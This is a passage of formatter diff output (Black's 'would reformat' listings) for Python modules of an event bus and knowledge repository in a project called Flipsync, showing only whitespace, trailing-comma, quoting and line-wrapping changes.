 )
 
 
 class EventPublisher(abc.ABC):
     """
     Interface for publishing events to the event bus.
-    
+
     Event publishers are responsible for sending events to the event bus
     for distribution to subscribers.
     """
-    
+
     @abc.abstractmethod
     async def publish(self, event: Event) -> str:
         """
         Publish an event to the event bus.
-        
+
         Args:
             event: The event to publish
-            
-        Returns:
-            The event ID
-            
-        Raises:
-            PublishError: If the event cannot be published
-        """
-        pass
-    
+
+        Returns:
+            The event ID
+
+        Raises:
+            PublishError: If the event cannot be published
+        """
+        pass
+
     @abc.abstractmethod
     async def publish_batch(self, events: List[Event]) -> List[str]:
         """
         Publish multiple events to the event bus.
-        
+
         Args:
             events: The events to publish
-            
+
         Returns:
             List of event IDs
-            
+
         Raises:
             PublishError: If the events cannot be published
         """
         pass
-    
+
     @abc.abstractmethod
     async def publish_command(
         self,
         command_name: str,
         parameters: Dict[str, Any] = None,
         target: Optional[str] = None,
         priority: EventPriority = EventPriority.NORMAL,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish a command event.
-        
+
         Args:
             command_name: Name of the command
             parameters: Command parameters
             target: Target agent or component
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
-        Raises:
-            PublishError: If the event cannot be published
-        """
-        pass
-    
+
+        Returns:
+            The event ID
+
+        Raises:
+            PublishError: If the event cannot be published
+        """
+        pass
+
     @abc.abstractmethod
     async def publish_notification(
         self,
         notification_name: str,
         data: Dict[str, Any] = None,
         priority: EventPriority = EventPriority.NORMAL,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish a notification event.
-        
+
         Args:
             notification_name: Name of the notification
             data: Notification data
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
-        Raises:
-            PublishError: If the event cannot be published
-        """
-        pass
-    
+
+        Returns:
+            The event ID
+
+        Raises:
+            PublishError: If the event cannot be published
+        """
+        pass
+
     @abc.abstractmethod
     async def publish_query(
         self,
         query_name: str,
         parameters: Dict[str, Any] = None,
         target: Optional[str] = None,
         priority: EventPriority = EventPriority.NORMAL,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish a query event.
-        
+
         Args:
             query_name: Name of the query
             parameters: Query parameters
             target: Target agent or component
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
-        Raises:
-            PublishError: If the event cannot be published
-        """
-        pass
-    
+
+        Returns:
+            The event ID
+
+        Raises:
+            PublishError: If the event cannot be published
+        """
+        pass
+
     @abc.abstractmethod
     async def publish_response(
         self,
         query_id: str,
         response_data: Any = None,
         is_success: bool = True,
         error_message: Optional[str] = None,
         priority: EventPriority = EventPriority.NORMAL,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish a response event.
-        
+
         Args:
             query_id: ID of the query being responded to
             response_data: Response data
             is_success: Whether the query was successful
             error_message: Error message if the query failed
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
-        Raises:
-            PublishError: If the event cannot be published
-        """
-        pass
-    
+
+        Returns:
+            The event ID
+
+        Raises:
+            PublishError: If the event cannot be published
+        """
+        pass
+
     @abc.abstractmethod
     async def publish_error(
         self,
         error_code: str,
         error_message: str,
         source_event_id: Optional[str] = None,
         details: Dict[str, Any] = None,
         priority: EventPriority = EventPriority.HIGH,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish an error event.
-        
+
         Args:
             error_code: Error code
             error_message: Error message
             source_event_id: ID of the event that caused the error
             details: Additional error details
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
+
+        Returns:
+            The event ID
+
         Raises:
             PublishError: If the event cannot be published
         """
         pass
 
 
 class PublishError(Exception):
     """
     Exception raised when an event cannot be published.
     """
-    
+
     def __init__(
         self,
         message: str,
         event_id: Optional[str] = None,
-        cause: Optional[Exception] = None
+        cause: Optional[Exception] = None,
     ):
         """
         Initialize a publish error.
-        
+
         Args:
             message: Error message
             event_id: ID of the event that could not be published
             cause: The exception that caused this error
         """
@@ -229,368 +235,364 @@
 
 
 class BaseEventPublisher(EventPublisher):
     """
     Base implementation of the EventPublisher interface.
-    
+
     This class provides a foundation for event publishers with common functionality.
     """
-    
-    def __init__(
-        self,
-        source_id: str,
-        logger: Optional[logging.Logger] = None
-    ):
+
+    def __init__(self, source_id: str, logger: Optional[logging.Logger] = None):
         """
         Initialize the base event publisher.
-        
+
         Args:
             source_id: ID of the event source (agent or component)
             logger: Logger instance, or None to create a default logger
         """
         self.source_id = source_id
         self.logger = logger or get_logger(f"event_publisher.{source_id}")
-    
+
     async def publish(self, event: Event) -> str:
         """
         Publish an event to the event bus.
-        
+
         Args:
             event: The event to publish
-            
-        Returns:
-            The event ID
-            
+
+        Returns:
+            The event ID
+
         Raises:
             PublishError: If the event cannot be published
         """
         # Set source if not already set
         if not event.source:
             event.source = self.source_id
-        
+
         # Mark as published
         event.mark_published()
-        
+
         try:
             # Delegate to implementation-specific method
             await self._publish_event(event)
-            
+
             self.logger.debug(
                 f"Published event {event.event_id} of type {event.event_type.value}",
                 extra={
                     "event_id": event.event_id,
                     "event_type": event.event_type.value,
                     "event_name": event.metadata.event_name,
                     "correlation_id": event.correlation_id,
-                }
+                },
             )
-            
+
             return event.event_id
         except Exception as e:
             error_msg = f"Failed to publish event {event.event_id}: {str(e)}"
             self.logger.error(
                 error_msg,
                 extra={
                     "event_id": event.event_id,
                     "event_type": event.event_type.value,
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise PublishError(error_msg, event_id=event.event_id, cause=e)
-    
+
     async def publish_batch(self, events: List[Event]) -> List[str]:
         """
         Publish multiple events to the event bus.
-        
+
         Args:
             events: The events to publish
-            
+
         Returns:
             List of event IDs
-            
+
         Raises:
             PublishError: If the events cannot be published
         """
         # Set source for all events if not already set
         for event in events:
             if not event.source:
                 event.source = self.source_id
-            
+
             # Mark as published
             event.mark_published()
-        
+
         try:
             # Delegate to implementation-specific method
             await self._publish_batch(events)
-            
+
             event_ids = [event.event_id for event in events]
-            
+
             self.logger.debug(
                 f"Published batch of {len(events)} events",
                 extra={
                     "event_count": len(events),
                     "event_ids": event_ids,
-                }
+                },
             )
-            
+
             return event_ids
         except Exception as e:
             error_msg = f"Failed to publish batch of {len(events)} events: {str(e)}"
             self.logger.error(
                 error_msg,
                 extra={
                     "event_count": len(events),
                     "error": str(e),
                 },
-                exc_info=True
+                exc_info=True,
             )
             raise PublishError(error_msg, cause=e)
-    
+
     async def publish_command(
         self,
         command_name: str,
         parameters: Dict[str, Any] = None,
         target: Optional[str] = None,
         priority: EventPriority = EventPriority.NORMAL,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish a command event.
-        
+
         Args:
             command_name: Name of the command
             parameters: Command parameters
             target: Target agent or component
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
+
+        Returns:
+            The event ID
+
         Raises:
             PublishError: If the event cannot be published
         """
         event = CommandEvent(
             command_name=command_name,
             parameters=parameters,
             target=target,
             source=self.source_id,
             priority=priority,
-            **kwargs
+            **kwargs,
         )
         return await self.publish(event)
-    
+
     async def publish_notification(
         self,
         notification_name: str,
         data: Dict[str, Any] = None,
         priority: EventPriority = EventPriority.NORMAL,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish a notification event.
-        
+
         Args:
             notification_name: Name of the notification
             data: Notification data
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
+
+        Returns:
+            The event ID
+
         Raises:
             PublishError: If the event cannot be published
         """
         event = NotificationEvent(
             notification_name=notification_name,
             data=data,
             source=self.source_id,
             priority=priority,
-            **kwargs
+            **kwargs,
         )
         return await self.publish(event)
-    
+
     async def publish_query(
         self,
         query_name: str,
         parameters: Dict[str, Any] = None,
         target: Optional[str] = None,
         priority: EventPriority = EventPriority.NORMAL,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish a query event.
-        
+
         Args:
             query_name: Name of the query
             parameters: Query parameters
             target: Target agent or component
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
+
+        Returns:
+            The event ID
+
         Raises:
             PublishError: If the event cannot be published
         """
         event = QueryEvent(
             query_name=query_name,
             parameters=parameters,
             target=target,
             source=self.source_id,
             priority=priority,
-            **kwargs
+            **kwargs,
         )
         return await self.publish(event)
-    
+
     async def publish_response(
         self,
         query_id: str,
         response_data: Any = None,
         is_success: bool = True,
         error_message: Optional[str] = None,
         priority: EventPriority = EventPriority.NORMAL,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish a response event.
-        
+
         Args:
             query_id: ID of the query being responded to
             response_data: Response data
             is_success: Whether the query was successful
             error_message: Error message if the query failed
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
+
+        Returns:
+            The event ID
+
         Raises:
             PublishError: If the event cannot be published
         """
         event = ResponseEvent(
             query_id=query_id,
             response_data=response_data,
             is_success=is_success,
             error_message=error_message,
             source=self.source_id,
             priority=priority,
-            **kwargs
+            **kwargs,
         )
         return await self.publish(event)
-    
+
     async def publish_error(
         self,
         error_code: str,
         error_message: str,
         source_event_id: Optional[str] = None,
         details: Dict[str, Any] = None,
         priority: EventPriority = EventPriority.HIGH,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Publish an error event.
-        
+
         Args:
             error_code: Error code
             error_message: Error message
             source_event_id: ID of the event that caused the error
             details: Additional error details
             priority: Event priority
             **kwargs: Additional metadata fields
-            
-        Returns:
-            The event ID
-            
+
+        Returns:
+            The event ID
+
         Raises:
             PublishError: If the event cannot be published
         """
         event = ErrorEvent(
             error_code=error_code,
             error_message=error_message,
             source_event_id=source_event_id,
             details=details,
             source=self.source_id,
             priority=priority,
-            **kwargs
+            **kwargs,
         )
         return await self.publish(event)
-    
+
     @abc.abstractmethod
     async def _publish_event(self, event: Event) -> None:
         """
         Implementation-specific method to publish an event.
-        
+
         Args:
             event: The event to publish
-            
+
         Raises:
             Exception: If the event cannot be published
         """
         pass
-    
+
     @abc.abstractmethod
     async def _publish_batch(self, events: List[Event]) -> None:
         """
         Implementation-specific method to publish multiple events.
-        
+
         Args:
             events: The events to publish
-            
+
         Raises:
             Exception: If the events cannot be published
         """
         pass
 
 
 class InMemoryEventPublisher(BaseEventPublisher):
     """
     In-memory implementation of the EventPublisher interface.
-    
+
     This publisher is used for testing and development, and publishes events
     to an in-memory event bus.
     """
-    
+
     def __init__(
         self,
         source_id: str,
         event_bus: Any,  # Will be EventBus once defined
-        logger: Optional[logging.Logger] = None
+        logger: Optional[logging.Logger] = None,
     ):
         """
         Initialize the in-memory event publisher.
-        
+
         Args:
             source_id: ID of the event source (agent or component)
             event_bus: The event bus to publish to
             logger: Logger instance, or None to create a default logger
         """
         super().__init__(source_id, logger)
         self.event_bus = event_bus
-    
+
     async def _publish_event(self, event: Event) -> None:
         """
         Publish an event to the in-memory event bus.
-        
+
         Args:
             event: The event to publish
-            
+
         Raises:
             Exception: If the event cannot be published
         """
         await self.event_bus.publish(event)
-    
+
     async def _publish_batch(self, events: List[Event]) -> None:
         """
         Publish multiple events to the in-memory event bus.
-        
+
         Args:
             events: The events to publish
-            
+
         Raises:
             Exception: If the events cannot be published
         """
         await self.event_bus.publish_batch(events)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/publisher.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_item.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_item.py	2025-06-19 04:03:50.070237+00:00
@@ -4,9 +4,11 @@
 This module re-exports the KnowledgeItem, KnowledgeType, and KnowledgeStatus classes
 from the knowledge_repository module.
 """
 
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
 )
 
-__all__ = ['KnowledgeItem', 'KnowledgeType', 'KnowledgeStatus']
+__all__ = ["KnowledgeItem", "KnowledgeType", "KnowledgeStatus"]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_item.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/in_memory_event_bus.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/in_memory_event_bus.py	2025-06-19 04:03:50.168717+00:00
@@ -19,11 +19,14 @@
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Set, Tuple
 
 from fs_agt_clean.core.monitoring import get_logger, record_metric
 from fs_agt_clean.core.coordination.event_system.event import Event, EventType
-from fs_agt_clean.core.coordination.event_system.event_bus import BaseEventBus, EventBusError
+from fs_agt_clean.core.coordination.event_system.event_bus import (
+    BaseEventBus,
+    EventBusError,
+)
 
 
 class InMemoryEventBus(BaseEventBus):
     """
     In-memory implementation of the event bus.
@@ -36,11 +39,11 @@
         self,
         bus_id: str = "in_memory_bus",
         logger: Optional[logging.Logger] = None,
         max_retry_attempts: int = 3,
         retry_delay_seconds: float = 1.0,
-        mobile_optimized: bool = False
+        mobile_optimized: bool = False,
     ):
         """
         Initialize the in-memory event bus.
 
         Args:
@@ -54,11 +57,11 @@
             bus_id=bus_id,
             logger=logger,
             persistence_enabled=True,  # In-memory persistence
             max_retry_attempts=max_retry_attempts,
             retry_delay_seconds=retry_delay_seconds,
-            mobile_optimized=mobile_optimized
+            mobile_optimized=mobile_optimized,
         )
 
         # Event storage by type and time
         self.events_by_type: Dict[EventType, List[Event]] = {
             event_type: [] for event_type in EventType
@@ -112,11 +115,11 @@
         Raises:
             Exception: If the event cannot be loaded
         """
         return self.events.get(event_id)
 
-    async def _find_matching_subscriptions(self, event: Event) -> List['Subscription']:
+    async def _find_matching_subscriptions(self, event: Event) -> List["Subscription"]:
         """
         Find subscriptions matching an event.
 
         Args:
             event: The event to match
@@ -134,11 +137,13 @@
                 if await subscription.matches(event):
                     matching.append(subscription)
 
         return matching
 
-    async def _deliver_event(self, event: Event, subscriptions: List['Subscription']) -> None:
+    async def _deliver_event(
+        self, event: Event, subscriptions: List["Subscription"]
+    ) -> None:
         """
         Deliver an event to subscribers.
 
         Args:
             event: The event to deliver
@@ -183,11 +188,11 @@
                     extra={
                         "event_id": event.event_id,
                         "subscription_id": subscription.id,
                         "error": str(e),
                     },
-                    exc_info=True
+                    exc_info=True,
                 )
 
                 # Retry if possible
                 if event.can_retry:
                     event.increment_retry()
@@ -214,21 +219,21 @@
                                 "event_id": event.event_id,
                                 "subscription_id": subscription.id,
                                 "error": str(retry_e),
                                 "retry_count": event.metadata.retry_count,
                             },
-                            exc_info=True
+                            exc_info=True,
                         )
                         # Add to dead letter queue after retry failure
                         self.dead_letter_queue[event.event_id] = (event, retry_e)
                         self.dead_letter_count += 1
                         self.logger.warning(
                             f"Added event {event.event_id} to dead letter queue after {event.metadata.retry_count} retries",
                             extra={
                                 "event_id": event.event_id,
                                 "retry_count": event.metadata.retry_count,
-                            }
+                            },
                         )
 
         # Update delivery metrics
         end_time = time.time()
         delivery_time = end_time - start_time
@@ -241,11 +246,11 @@
         if total_deliveries > 0:
             self.total_delivery_time += delivery_time
             self.avg_delivery_time = self.total_delivery_time / total_deliveries
             self.max_delivery_time = max(self.max_delivery_time, delivery_time)
 
-    async def _register_subscription(self, subscription: 'Subscription') -> None:
+    async def _register_subscription(self, subscription: "Subscription") -> None:
         """
         Register a subscription.
 
         Args:
             subscription: The subscription to register
@@ -254,11 +259,11 @@
             Exception: If the subscription cannot be registered
         """
         # Nothing to do for in-memory implementation
         pass
 
-    async def _unregister_subscription(self, subscription: 'Subscription') -> None:
+    async def _unregister_subscription(self, subscription: "Subscription") -> None:
         """
         Unregister a subscription.
 
         Args:
             subscription: The subscription to unregister
@@ -274,11 +279,11 @@
         event_type: Optional[EventType] = None,
         source: Optional[str] = None,
         target: Optional[str] = None,
         start_time: Optional[datetime] = None,
         end_time: Optional[datetime] = None,
-        limit: int = 100
+        limit: int = 100,
     ) -> List[Event]:
         """
         Get events matching the given criteria.
 
         Args:
@@ -341,11 +346,11 @@
             metric_type="counter",
             category="event_system",
             labels={
                 "bus_id": self.bus_id,
                 "operation": operation,
-            }
+            },
         )
 
         # Record delivery metrics if available
         if operation in ["publish", "publish_batch"] and self.delivery_count > 0:
             await record_metric(
@@ -354,14 +359,14 @@
                 metric_type="gauge",
                 category="event_system",
                 labels={
                     "bus_id": self.bus_id,
                     "operation": operation,
-                }
+                },
             )
 
-    async def create_subscriber(self, subscriber_id: str) -> 'EventSubscriber':
+    async def create_subscriber(self, subscriber_id: str) -> "EventSubscriber":
         """
         Create a subscriber for this event bus.
 
         Args:
             subscriber_id: ID of the subscriber
@@ -370,11 +375,14 @@
             A new subscriber instance
 
         Raises:
             EventBusError: If the subscriber cannot be created
         """
-        from fs_agt_clean.core.coordination.event_system.subscriber import InMemoryEventSubscriber
+        from fs_agt_clean.core.coordination.event_system.subscriber import (
+            InMemoryEventSubscriber,
+        )
+
         return InMemoryEventSubscriber(subscriber_id, self)
 
     async def _get_impl_metrics(self) -> Dict[str, Any]:
         """
         Get implementation-specific metrics.
@@ -387,11 +395,12 @@
         """
         return {
             "avg_delivery_time": self.avg_delivery_time,
             "max_delivery_time": self.max_delivery_time,
             "events_by_type": {
-                event_type.name: len(events) for event_type, events in self.events_by_type.items()
+                event_type.name: len(events)
+                for event_type, events in self.events_by_type.items()
             },
             "events_by_source_count": len(self.events_by_source),
             "events_by_target_count": len(self.events_by_target),
             "mobile_optimized": self.mobile_optimized,
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/event_system/in_memory_event_bus.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_publisher.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_publisher.py	2025-06-19 04:03:50.254747+00:00
@@ -8,149 +8,154 @@
 import abc
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_publisher
+    Event,
+    EventType,
+    EventPriority,
+    create_publisher,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus, KnowledgeError
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
+    KnowledgeError,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.embedding_provider import (
-    EmbeddingProvider, EmbeddingError
+    EmbeddingProvider,
+    EmbeddingError,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_validator import (
-    KnowledgeValidator, ValidationError
+    KnowledgeValidator,
+    ValidationError,
 )
 
 
 class PublishError(Exception):
     """Base exception for knowledge publisher errors."""
-    
+
     def __init__(
         self,
         message: str,
         knowledge_id: Optional[str] = None,
-        cause: Optional[Exception] = None
+        cause: Optional[Exception] = None,
     ):
         """
         Initialize a publish error.
-        
+
         Args:
             message: Error message
             knowledge_id: ID of the knowledge item related to the error
             cause: Original exception that caused this error
         """
         self.message = message
         self.knowledge_id = knowledge_id
         self.cause = cause
-        
+
         # Create a detailed error message
         detailed_message = message
         if knowledge_id:
             detailed_message += f" (knowledge_id: {knowledge_id})"
         if cause:
             detailed_message += f" - caused by: {str(cause)}"
-        
+
         super().__init__(detailed_message)
 
 
 class KnowledgePublisher(abc.ABC):
     """
     Interface for knowledge publishers.
-    
+
     Knowledge publishers publish knowledge to the knowledge repository,
     including validation and notification.
     """
-    
+
     @abc.abstractmethod
     async def publish_knowledge(
         self,
         knowledge_type: KnowledgeType,
         topic: str,
         content: Any,
         metadata: Optional[Dict[str, Any]] = None,
         source_id: Optional[str] = None,
         access_control: Optional[Dict[str, Any]] = None,
-        tags: Optional[Set[str]] = None
+        tags: Optional[Set[str]] = None,
     ) -> str:
         """
         Publish a knowledge item to the repository.
-        
+
         Args:
             knowledge_type: Type of knowledge
             topic: Topic or category of the knowledge
             content: Content of the knowledge item
             metadata: Additional metadata about the knowledge
             source_id: ID of the source that created the knowledge
             access_control: Access control information
             tags: Tags for categorizing the knowledge
-            
+
         Returns:
             ID of the published knowledge item
-            
+
         Raises:
             PublishError: If the knowledge item cannot be published
         """
         pass
-    
+
     @abc.abstractmethod
     async def update_knowledge(
         self,
         knowledge_id: str,
         content: Optional[Any] = None,
         metadata: Optional[Dict[str, Any]] = None,
         status: Optional[KnowledgeStatus] = None,
-        tags: Optional[Set[str]] = None
+        tags: Optional[Set[str]] = None,
     ) -> str:
         """
         Update a knowledge item in the repository.
-        
+
         Args:
             knowledge_id: ID of the knowledge item
             content: New content
             metadata: New or updated metadata
             status: New status
             tags: New or updated tags
-            
+
         Returns:
             ID of the updated knowledge item
-            
+
         Raises:
             PublishError: If the knowledge item cannot be updated
         """
         pass
-    
+
     @abc.abstractmethod
     async def delete_knowledge(self, knowledge_id: str) -> bool:
         """
         Delete a knowledge item from the repository.
-        
+
         Args:
             knowledge_id: ID of the knowledge item
-            
+
         Returns:
             True if the knowledge item was deleted
-            
+
         Raises:
             PublishError: If the knowledge item cannot be deleted
         """
         pass
-    
+
     @abc.abstractmethod
-    async def publish_batch(
-        self,
-        items: List[Dict[str, Any]]
-    ) -> List[str]:
+    async def publish_batch(self, items: List[Dict[str, Any]]) -> List[str]:
         """
         Publish multiple knowledge items to the repository.
-        
+
         Args:
             items: List of knowledge items to publish
-            
+
         Returns:
             List of IDs of the published knowledge items
-            
+
         Raises:
             PublishError: If the knowledge items cannot be published
         """
         pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_publisher.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_filter.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_filter.py	2025-06-19 04:03:50.314540+00:00
@@ -5,155 +5,159 @@
 import abc
 import re
 from typing import Any, Dict, List, Optional, Set, Tuple, Union
 
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_item import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
 )
 
 
 class KnowledgeFilter(abc.ABC):
     """
     Base class for knowledge filters.
     """
-    
+
     @abc.abstractmethod
     def matches(self, knowledge: KnowledgeItem) -> bool:
         """
         Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches the filter, False otherwise
         """
         pass
 
 
 class TopicFilter(KnowledgeFilter):
     """
     Filter knowledge items by topic.
     """
-    
-    def __init__(self, topics: Optional[Set[str]] = None, patterns: Optional[Set[str]] = None):
+
+    def __init__(
+        self, topics: Optional[Set[str]] = None, patterns: Optional[Set[str]] = None
+    ):
         """
         Initialize the topic filter.
-        
+
         Args:
             topics: Set of topics to match (exact match)
             patterns: Set of topic patterns to match (regex match)
         """
         self.topics = topics or set()
         self.patterns = patterns or set()
         self.compiled_patterns = [re.compile(pattern) for pattern in self.patterns]
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches the filter, False otherwise
         """
         # Check for exact topic match
         if knowledge.topic in self.topics:
             return True
-        
+
         # Check for pattern match
         for pattern in self.compiled_patterns:
             if pattern.match(knowledge.topic):
                 return True
-        
+
         return False
 
 
 class TypeFilter(KnowledgeFilter):
     """
     Filter knowledge items by type.
     """
-    
+
     def __init__(self, types: Set[KnowledgeType]):
         """
         Initialize the type filter.
-        
+
         Args:
             types: Set of knowledge types to match
         """
         self.types = types
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches the filter, False otherwise
         """
         return knowledge.knowledge_type in self.types
 
 
 class StatusFilter(KnowledgeFilter):
     """
     Filter knowledge items by status.
     """
-    
+
     def __init__(self, statuses: Set[KnowledgeStatus]):
         """
         Initialize the status filter.
-        
+
         Args:
             statuses: Set of knowledge statuses to match
         """
         self.statuses = statuses
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches the filter, False otherwise
         """
         return knowledge.status in self.statuses
 
 
 class TagFilter(KnowledgeFilter):
     """
     Filter knowledge items by tag.
     """
-    
+
     def __init__(self, tags: Set[str], match_all: bool = False):
         """
         Initialize the tag filter.
-        
+
         Args:
             tags: Set of tags to match
             match_all: If True, all tags must match; if False, any tag must match
         """
         self.tags = tags
         self.match_all = match_all
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches the filter, False otherwise
         """
         if not knowledge.tags:
             return False
-        
+
         if self.match_all:
             # All tags must match
             return all(tag in knowledge.tags for tag in self.tags)
         else:
             # Any tag must match
@@ -162,104 +166,104 @@
 
 class SourceFilter(KnowledgeFilter):
     """
     Filter knowledge items by source.
     """
-    
+
     def __init__(self, sources: Set[str]):
         """
         Initialize the source filter.
-        
+
         Args:
             sources: Set of source IDs to match
         """
         self.sources = sources
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches the filter, False otherwise
         """
         return knowledge.source_id in self.sources
 
 
 class CompositeFilter(KnowledgeFilter):
     """
     Base class for composite filters.
     """
-    
+
     def __init__(self, filters: List[KnowledgeFilter]):
         """
         Initialize the composite filter.
-        
+
         Args:
             filters: List of filters to combine
         """
         self.filters = filters
 
 
 class AndFilter(CompositeFilter):
     """
     Filter that matches if all child filters match.
     """
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches all child filters, False otherwise
         """
         return all(filter.matches(knowledge) for filter in self.filters)
 
 
 class OrFilter(CompositeFilter):
     """
     Filter that matches if any child filter matches.
     """
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item matches any child filter, False otherwise
         """
         return any(filter.matches(knowledge) for filter in self.filters)
 
 
 class NotFilter(KnowledgeFilter):
     """
     Filter that matches if the child filter does not match.
     """
-    
+
     def __init__(self, filter: KnowledgeFilter):
         """
         Initialize the NOT filter.
-        
+
         Args:
             filter: Filter to negate
         """
         self.filter = filter
-    
-    def matches(self, knowledge: KnowledgeItem) -> bool:
-        """
-        Check if a knowledge item matches the filter.
-        
-        Args:
-            knowledge: Knowledge item to check
-            
+
+    def matches(self, knowledge: KnowledgeItem) -> bool:
+        """
+        Check if a knowledge item matches the filter.
+
+        Args:
+            knowledge: Knowledge item to check
+
         Returns:
             True if the knowledge item does not match the child filter, False otherwise
         """
         return not self.filter.matches(knowledge)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_filter.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_retriever.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/knowledge_retriever.py	2025-06-19 04:03:50.409435+00:00
@@ -11,220 +11,225 @@
 
 import numpy as np
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.knowledge_repository.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus, KnowledgeError
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
+    KnowledgeError,
 )
 from fs_agt_clean.core.coordination.knowledge_repository.embedding_provider import (
-    EmbeddingProvider, EmbeddingError
+    EmbeddingProvider,
+    EmbeddingError,
 )
 
 
 @dataclass
 class QueryResult:
     """
     Result of a knowledge query.
-    
+
